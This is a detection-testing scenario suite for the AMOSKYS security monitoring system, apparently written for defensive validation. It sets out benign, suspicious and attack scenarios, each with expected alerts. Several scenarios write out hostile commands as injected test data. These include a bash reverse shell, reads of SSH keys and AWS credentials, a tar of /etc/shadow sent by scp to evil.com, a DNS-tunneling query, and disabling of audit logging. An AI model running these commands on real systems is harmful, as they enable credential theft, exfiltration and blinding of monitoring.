# AMOSKYS Scenario Suite

> **Status:** Active — Created 2026-02-16  
> **Purpose:** 25 reproducible scenarios with ground truth and expected outputs  
> **Rule:** Every scenario must define what fires, what doesn't, and why

---

## Scenario Structure

Each scenario defines:
- **ID**: `SC-NN`
- **Category**: Benign / Low-Signal / Malicious-Pattern / Lateral-Movement
- **Description**: What happens in plain language
- **Execution Steps**: Exact commands or actions to reproduce
- **Ground Truth**: What actually occurred (objective fact)
- **Expected AMOSKYS Output**: Which agents/probes should fire, with what severity
- **Expected Non-Fires**: What should NOT fire (false-positive guardrails)
- **MITRE Mapping**: Applicable technique IDs
- **Environment**: Mac / Linux / Both
- **Validation Status**: Untested / Passed / Failed / Blocked

---

## Category 1: Benign Baselines (SC-01 through SC-05)

These scenarios represent normal developer workstation activity. **Zero alerts expected.**

### SC-01: Normal Development Session

| Field | Value |
|-------|-------|
| Category | Benign |
| Description | Developer opens terminal, runs `git pull`, `npm install`, `python manage.py runserver`, edits files in VS Code, browses docs |
| Execution Steps | 1. `git pull origin main` 2. `npm install` 3. `python3 manage.py runserver` 4. Edit 5 files in VS Code 5. Browse docs in Chrome |
| Ground Truth | Standard development workflow. All processes are user-initiated, signed, from known paths |
| Expected Fires | None — all agents should produce `agent_metrics` only |
| Expected Non-Fires | ProcessSpawn (git, npm, python are legitimate), LOLBin (no abuse pattern), FIM (no system file changes) |
| MITRE | N/A |
| Environment | Mac |
| Status | **Untested** |

### SC-02: System Updates

| Field | Value |
|-------|-------|
| Category | Benign |
| Description | macOS system update, `brew update && brew upgrade`, pip install in venv |
| Execution Steps | 1. `softwareupdate -l` 2. `brew update && brew upgrade` 3. `. venv/bin/activate && pip install -r requirements.txt` |
| Ground Truth | Package manager operations. Files change in `/usr/local/Cellar`, `venv/lib`. Processes are from trusted package managers |
| Expected Fires | None |
| Expected Non-Fires | FIM probes (Homebrew paths are not sensitive), Persistence probes (no LaunchAgent changes), ProcAgent (brew is legitimate) |
| MITRE | N/A |
| Environment | Mac |
| Status | **Untested** |

### SC-03: SSH to Known Server

| Field | Value |
|-------|-------|
| Category | Benign |
| Description | SSH to production server using existing key, run a few commands, logout |
| Execution Steps | 1. `ssh -i ~/.ssh/amoskys-deploy ubuntu@3.147.175.238` 2. `uptime && df -h` 3. `exit` |
| Ground Truth | Outbound TCP to port 22 with key-based auth. Single session, normal duration |
| Expected Fires | None |
| Expected Non-Fires | SSHBruteForce (single connection, key auth), C2Beacon (single session), DataExfil (minimal data) |
| MITRE | N/A |
| Environment | Mac |
| Status | **Untested** |

### SC-04: Docker Container Operations

| Field | Value |
|-------|-------|
| Category | Benign |
| Description | Build and run Docker containers for development |
| Execution Steps | 1. `docker build -t myapp .` 2. `docker run -d -p 8080:80 myapp` 3. `docker logs myapp` 4. `docker stop myapp` |
| Ground Truth | Docker daemon operations. Process tree has docker → containerd → shim. Network on bridge |
| Expected Fires | None |
| Expected Non-Fires | ProcessTreeAnomaly (docker process trees are standard), SuspiciousTunnel (bridge networking) |
| MITRE | N/A |
| Environment | Mac |
| Status | **Untested** |

### SC-05: Cron Job for Backups

| Field | Value |
|-------|-------|
| Category | Benign |
| Description | User adds a crontab entry for daily backup |
| Execution Steps | 1. `crontab -e` → add `0 2 * * * /usr/local/bin/backup.sh` 2. `crontab -l` to verify |
| Ground Truth | User-initiated crontab modification. Script path is legitimate |
| Expected Fires | CronJobPersistenceProbe MAY fire with LOW severity (crontab modified) — acceptable informational alert |
| Expected Non-Fires | Persistence probes should not escalate to HIGH/CRITICAL |
| MITRE | T1053.003 (informational only) |
| Environment | Both |
| Status | **Untested** |

---

## Category 2: Low-Signal Suspicious (SC-06 through SC-12)

These scenarios look unusual but are not definitively malicious. **Low/Medium alerts expected.**

### SC-06: Unsigned Binary Execution

| Field | Value |
|-------|-------|
| Category | Low-Signal |
| Description | User downloads and runs an unsigned binary from the internet |
| Execution Steps | 1. `curl -o /tmp/tool https://example.com/tool` 2. `chmod +x /tmp/tool` 3. `/tmp/tool` |
| Ground Truth | Binary executed from /tmp, unsigned, downloaded via curl |
| Expected Fires | BinaryFromTempProbe (T1204, T1059), ExecveHighRiskProbe (T1059, T1204.002 — Linux), ProcessSpawnProbe (new process from /tmp) |
| Expected Non-Fires | C2Beacon (single execution, not periodic), ReverseShell (no network redirection) |
| MITRE | T1059, T1204, T1204.002 |
| Environment | Both |
| Status | **Untested** |

### SC-07: Unusual Parent-Child Process

| Field | Value |
|-------|-------|
| Category | Low-Signal |
| Description | A web server spawns a shell process |
| Execution Steps | 1. Start Python HTTP server: `python3 -m http.server 8080` 2. Simulate: trigger subprocess from within (e.g., CGI or subprocess.run("bash")) |
| Ground Truth | python3 → bash is unusual for a web server context |
| Expected Fires | ProcessTreeAnomalyProbe (T1055, T1059 — unusual parent-child) |
| Expected Non-Fires | LOLBinExecution (bash itself is not a LOLBin unless combined with abuse pattern) |
| MITRE | T1055, T1059 |
| Environment | Both |
| Status | **Untested** |

### SC-08: High Outbound Data Transfer

| Field | Value |
|-------|-------|
| Category | Low-Signal |
| Description | Large file upload to cloud storage |
| Execution Steps | 1. `dd if=/dev/urandom of=/tmp/bigfile bs=1M count=500` 2. `curl -T /tmp/bigfile https://storage.example.com/upload` |
| Ground Truth | 500MB outbound transfer. Single destination, HTTPS, user-initiated |
| Expected Fires | DataExfilVolumeSpikeProbe (T1041, T1048 — volume > baseline), NewExternalServiceProbe (first connection to this IP) |
| Expected Non-Fires | C2Beacon (single transfer, not periodic), DNSTunneling (normal DNS) |
| MITRE | T1041, T1048 |
| Environment | Both |
| Status | **Untested** |

### SC-09: Many Failed SSH Attempts (Legitimate)

| Field | Value |
|-------|-------|
| Category | Low-Signal |
| Description | Developer forgets password, tries 5 times before using key auth |
| Execution Steps | 1. `ssh user@server` (wrong password × 5) 2. `ssh -i ~/.ssh/key user@server` (success) |
| Ground Truth | 5 failed + 1 success from same IP. User-initiated, not automated |
| Expected Fires | SSHBruteForceProbe may fire at LOW (5 failures hits threshold) but should not escalate |
| Expected Non-Fires | PasswordSpray (same user, not many users), AccountLockoutStorm (single user) |
| MITRE | T1110 (informational) |
| Environment | Both |
| Status | **Untested** |

### SC-10: DNS Queries to Unusual TLD

| Field | Value |
|-------|-------|
| Category | Low-Signal |
| Description | User visits website on .tk or .xyz domain |
| Execution Steps | 1. `curl https://example.tk/page` 2. `nslookup test.xyz` |
| Ground Truth | DNS queries to uncommon TLDs. Content may be legitimate |
| Expected Fires | SuspiciousTLDProbe (T1071.004 — risky TLD) at LOW severity |
| Expected Non-Fires | DGAScore (domain names are readable, not random), DNSTunneling (normal query size) |
| MITRE | T1071.004 |
| Environment | Both |
| Status | **Untested** |

### SC-11: New USB Storage Device

| Field | Value |
|-------|-------|
| Category | Low-Signal |
| Description | User plugs in a new USB flash drive |
| Execution Steps | 1. Insert USB drive 2. `diskutil list` to see it mounted 3. Copy a file to it |
| Ground Truth | New USB mass storage device. Known vendor (e.g., SanDisk) |
| Expected Fires | USBConnectionEdgeProbe (T1200, T1091 — new device), USBStorageProbe (T1052, T1091 — storage mounted) |
| Expected Non-Fires | HIDAnomaly (not a HID device), HighRiskPeripheral (known vendor, low risk) |
| MITRE | T1200, T1091, T1052 |
| Environment | Mac |
| Status | **Untested** |

### SC-12: Shell Profile Edit

| Field | Value |
|-------|-------|
| Category | Low-Signal |
| Description | Developer adds an alias to .zshrc |
| Execution Steps | 1. `echo 'alias ll="ls -la"' >> ~/.zshrc` 2. `source ~/.zshrc` |
| Ground Truth | User-initiated .zshrc modification. Content is benign (alias) |
| Expected Fires | ShellProfileHijackProbe (T1037.004, T1546.004) at LOW/INFO — profile modified |
| Expected Non-Fires | Should not escalate to HIGH (content is a simple alias, not a reverse shell) |
| MITRE | T1037.004 (informational) |
| Environment | Mac |
| Status | **Untested** |

---

## Category 3: Clear Malicious Patterns (SC-13 through SC-20)

These simulate attack patterns using safe methods. **HIGH/CRITICAL alerts expected.**

### SC-13: Reverse Shell Pattern (Simulated)

| Field | Value |
|-------|-------|
| Category | Malicious-Pattern |
| Description | Process command line matches reverse shell pattern (simulated, not actually connecting) |
| Execution Steps | 1. Create a process entry (mock) with command: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` — use stub collector or inject into agent |
| Ground Truth | Command string matches reverse shell pattern. No actual connection made |
| Expected Fires | ReverseShellDetector (T1059), LOLBinDetector (bash abuse), ExecveHighRiskProbe if from /tmp |
| Expected Non-Fires | N/A — this should fire |
| MITRE | T1059.004 |
| Environment | Both (via stub/injection) |
| Status | **Unit tested** ✅ (threat_detection.py — 7 reverse shell tests pass) |

### SC-14: Credential Dumping Attempt (Simulated)

| Field | Value |
|-------|-------|
| Category | Malicious-Pattern |
| Description | Process reads SSH private key or AWS credentials file |
| Execution Steps | 1. Inject file event: `cat ~/.ssh/id_rsa` or `cat ~/.aws/credentials` |
| Ground Truth | Attempt to read credential files |
| Expected Fires | CredentialAccessDetector (T1552), SSHKeyBackdoorProbe if key is copied |
| Expected Non-Fires | N/A |
| MITRE | T1552.001, T1552.004 |
| Environment | Both (via stub/injection) |
| Status | **Unit tested** ✅ (threat_detection.py — 6 credential tests pass) |

### SC-15: LaunchAgent Persistence (Simulated)

| Field | Value |
|-------|-------|
| Category | Malicious-Pattern |
| Description | New plist file created in ~/Library/LaunchAgents |
| Execution Steps | 1. Create mock file event: new file at `~/Library/LaunchAgents/com.evil.backdoor.plist` |
| Ground Truth | LaunchAgent persistence mechanism installed |
| Expected Fires | LaunchAgentDaemonProbe (T1543.001, T1037.005) at HIGH, PersistenceDetector at HIGH |
| Expected Non-Fires | SystemdServicePersistence (macOS, not Linux) |
| MITRE | T1543.001, T1037.005 |
| Environment | Mac (via stub/injection) |
| Status | **Unit tested** ✅ (threat_detection.py — 6 persistence tests pass) |

### SC-16: C2 Beaconing Pattern (Simulated)

| Field | Value |
|-------|-------|
| Category | Malicious-Pattern |
| Description | Process makes outbound connections at regular 60-second intervals to same IP |
| Execution Steps | 1. Inject network context: 10 connections to 185.234.72.100:443 at t, t+60, t+120, ... |
| Ground Truth | Regular interval outbound traffic to suspicious IP |
| Expected Fires | C2Detector (beaconing, T1071.001), C2BeaconFlowProbe (T1071.001, T1071.004) |
| Expected Non-Fires | Normal HTTPS (not periodic, not to suspicious IP) |
| MITRE | T1071.001, T1071.004 |
| Environment | Both (via stub/injection) |
| Status | **Unit tested** ✅ (threat_detection.py — C2 beaconing test passes) |

### SC-17: Data Exfiltration via tar + scp (Simulated)

| Field | Value |
|-------|-------|
| Category | Malicious-Pattern |
| Description | Process tars sensitive directory and scps to external host |
| Execution Steps | 1. Inject process: `tar czf /tmp/data.tar.gz /etc/shadow /home/` 2. Inject process: `scp /tmp/data.tar.gz attacker@evil.com:/loot/` |
| Ground Truth | Sensitive data archived and transferred externally |
| Expected Fires | ExfiltrationDetector (tar sensitive dirs, T1041), DataExfilVolumeSpikeProbe |
| Expected Non-Fires | N/A |
| MITRE | T1041, T1048 |
| Environment | Both (via stub/injection) |
| Status | **Unit tested** ✅ (threat_detection.py — 7 exfiltration tests pass) |

### SC-18: SSH Brute Force Attack (Simulated)

| Field | Value |
|-------|-------|
| Category | Malicious-Pattern |
| Description | 100+ failed SSH attempts from single IP in 5 minutes |
| Execution Steps | 1. Inject auth events: 100 failures from 203.0.113.1 to port 22 within 300s window |
| Ground Truth | Automated brute force attack |
| Expected Fires | SSHBruteForceProbe (T1110) at HIGH/CRITICAL, AccountLockoutStormProbe (T1110, T1499) |
| Expected Non-Fires | PasswordSpray (same source IP, same target user) |
| MITRE | T1110, T1078, T1499 |
| Environment | Both (via stub/injection) |
| Status | **Untested** — needs probe-level integration test |

### SC-19: Kernel Module Load (Linux Only)

| Field | Value |
|-------|-------|
| Category | Malicious-Pattern |
| Description | Unknown kernel module loaded via insmod |
| Execution Steps | 1. Inject audit event: `type=SYSCALL syscall=175 (init_module)` with unknown module name |
| Ground Truth | Rootkit-like behavior — loading unsigned kernel module |
| Expected Fires | KernelModuleLoadProbe (T1014, T1547.006) at CRITICAL |
| Expected Non-Fires | PrivEscSyscall (not a privesc syscall) |
| MITRE | T1014, T1547.006 |
| Environment | Linux only |
| Status | **Untested** — needs Linux environment |

### SC-20: DNS Tunneling (Simulated)

| Field | Value |
|-------|-------|
| Category | Malicious-Pattern |
| Description | DNS TXT queries with very long subdomain labels (data exfiltration) |
| Execution Steps | 1. Inject DNS events: queries for `aGVsbG8gd29ybGQ.data.evil.com` (base64-encoded data in subdomain) with TXT type |
| Ground Truth | DNS tunneling — data encoded in DNS queries |
| Expected Fires | DNSTunnelingProbe (T1048.003), LargeTXTTunnelingProbe (T1048.001), DGAScoreProbe (random-looking labels) |
| Expected Non-Fires | SuspiciousTLD (evil.com uses .com, not a suspicious TLD) |
| MITRE | T1048.001, T1048.003, T1071.004 |
| Environment | Both (via stub/injection) |
| Status | **Untested** — needs probe-level integration test |

---

## Category 4: Lateral Movement Patterns (SC-21 through SC-25)

These simulate multi-host attack progression. **HIGH/CRITICAL alerts expected.**

### SC-21: SMB Lateral Movement (Simulated)

| Field | Value |
|-------|-------|
| Category | Lateral-Movement |
| Description | Outbound SMB connections to multiple internal hosts |
| Execution Steps | 1. Inject flow events: connections to 10.0.0.2:445, 10.0.0.3:445, 10.0.0.4:445 from same source |
| Ground Truth | SMB scanning or lateral movement to internal hosts |
| Expected Fires | LateralSMBWinRMProbe (T1021.002), PortScanSweepProbe (T1046) |
| Expected Non-Fires | DataExfil (internal traffic), C2Beacon (not to external) |
| MITRE | T1021.002, T1046 |
| Environment | Both (via stub/injection) |
| Status | **Untested** |

### SC-22: Privilege Escalation Chain (Simulated)

| Field | Value |
|-------|-------|
| Category | Lateral-Movement |
| Description | Process escalates: user → sudo → setuid → root shell |
| Execution Steps | 1. Inject process events: user process calls sudo 2. Inject audit event: setuid(0) syscall 3. Inject process: new root shell |
| Ground Truth | Privilege escalation chain |
| Expected Fires | SudoElevationProbe (T1548.003), PrivEscSyscallProbe (T1068, T1548.001), ProcessTreeAnomalyProbe |
| Expected Non-Fires | N/A |
| MITRE | T1068, T1548.001, T1548.003 |
| Environment | Linux (via stub/injection) |
| Status | **Untested** |

### SC-23: Multi-Stage Attack: Recon → Exploit → Persist

| Field | Value |
|-------|-------|
| Category | Lateral-Movement |
| Description | Attacker scans ports, exploits web service, drops persistence |
| Execution Steps | 1. Inject flow: port scan (>20 ports on target) 2. Inject protocol: SQL injection in HTTP 3. Inject file: webshell dropped in /var/www/html 4. Inject persistence: crontab entry added |
| Ground Truth | Full attack lifecycle: Discovery → Initial Access → Persistence |
| Expected Fires | PortScanSweepProbe, SQLInjectionProbe, WebShellDropProbe, CronJobPersistenceProbe |
| FusionEngine Expected | Incident created linking all 4 events, severity CRITICAL |
| MITRE | T1046, T1190, T1505.003, T1053.003 |
| Environment | Linux (via stub/injection) |
| Status | **Untested** — requires end-to-end pipeline (GAP-04) |

### SC-24: Credential Theft → Lateral Movement

| Field | Value |
|-------|-------|
| Category | Lateral-Movement |
| Description | Attacker reads SSH keys, then uses them to SSH to internal host |
| Execution Steps | 1. Inject file event: `cat /root/.ssh/id_rsa` 2. Inject flow: outbound SSH to internal host 10.0.0.5:22 3. Inject auth: successful SSH login on 10.0.0.5 from attacker IP |
| Ground Truth | Credential theft followed by lateral movement |
| Expected Fires | CredentialAccessDetector, SSHKeyBackdoorProbe, LateralSMBWinRMProbe (or flow probe for SSH) |
| FusionEngine Expected | Incident linking credential access + lateral movement |
| MITRE | T1552.004, T1021.004 |
| Environment | Linux (via stub/injection) |
| Status | **Untested** — requires end-to-end pipeline (GAP-04) |

### SC-25: Defense Evasion: Audit Log Tampering

| Field | Value |
|-------|-------|
| Category | Lateral-Movement |
| Description | Attacker disables audit logging and clears logs |
| Execution Steps | 1. Inject audit event: `auditctl -D` (clear rules) 2. Inject file event: `/var/log/audit/audit.log` truncated 3. Inject process: `kill -9 $(pidof auditd)` |
| Ground Truth | Attacker attempting to blind security monitoring |
| Expected Fires | AuditTamperProbe (T1562.001, T1070.002) at CRITICAL |
| FusionEngine Expected | Incident with Defense Evasion tactic |
| MITRE | T1562.001, T1070.002 |
| Environment | Linux (via stub/injection) |
| Status | **Untested** |

---

## Scenario Validation Summary

| Category | Count | Unit Tested | Probe Tested | E2E Tested | Blocked |
|----------|-------|-------------|-------------|------------|---------|
| Benign Baselines | 5 | 0 | 0 | 0 | 0 |
| Low-Signal Suspicious | 7 | 0 | 0 | 0 | 0 |
| Malicious Patterns | 8 | 5 (via threat_detection unit tests) | 0 | 0 | 1 (Linux-only) |
| Lateral Movement | 5 | 0 | 0 | 0 | 2 (need E2E pipeline) |
| **Total** | **25** | **5** | **0** | **0** | **3** |

---

## Implementation Priority

### Phase 1: Event Injection Framework (prerequisite for all scenarios)
- [ ] `scripts/rig/generate_events.py` — Create synthetic events in protobuf format
- [ ] `scripts/rig/inject_events.py` — Inject events into running agent or queue DB
- [ ] StubCollector extensions: allow scenario-specific event sequences

### Phase 2: Benign Baseline (SC-01 through SC-05)
- [ ] Run agents on developer Mac for 1 hour during normal work
- [ ] Count total alerts — target: 0 HIGH/CRITICAL, ≤5 INFO/LOW
- [ ] Document false-positive rate

### Phase 3: Malicious Pattern Validation (SC-13 through SC-20)
- [ ] Extend stub collectors with scenario-specific event generators
- [ ] Run each scenario, capture queue output, verify expected probes fire
- [ ] Verify MITRE technique IDs in output

### Phase 4: Multi-Stage and Lateral Movement (SC-21 through SC-25)
- [ ] Requires E2E pipeline (GAP-04 fix)
- [ ] FusionEngine must correlate events across agents
- [ ] Incident objects must link multiple events with MITRE tactics

---

## Ground Truth Capture Template

For each scenario execution, record:

```yaml
scenario_id: SC-NN
git_commit: <hash>
timestamp: <ISO-8601>
environment:
  os: macOS 15.x / Ubuntu 24.04
  python: 3.11.x
  device_id: mac-akash
config:
  collection_interval: 30
  metrics_interval: 60
  agents_running: [kernel_audit_v2, protocol_collectors_v2, device_discovery_v2]
execution:
  steps_performed: [...]
  duration_seconds: N
results:
  queue_rows_before: N
  queue_rows_after: N
  events_by_type: {agent_metrics: N, protocol_threat: N, ...}
  alerts_fired:
    - probe: <name>
      severity: <level>
      mitre: [T1xxx]
      evidence: <summary>
  false_positives: N
  missed_detections: N
  notes: <observations>
```
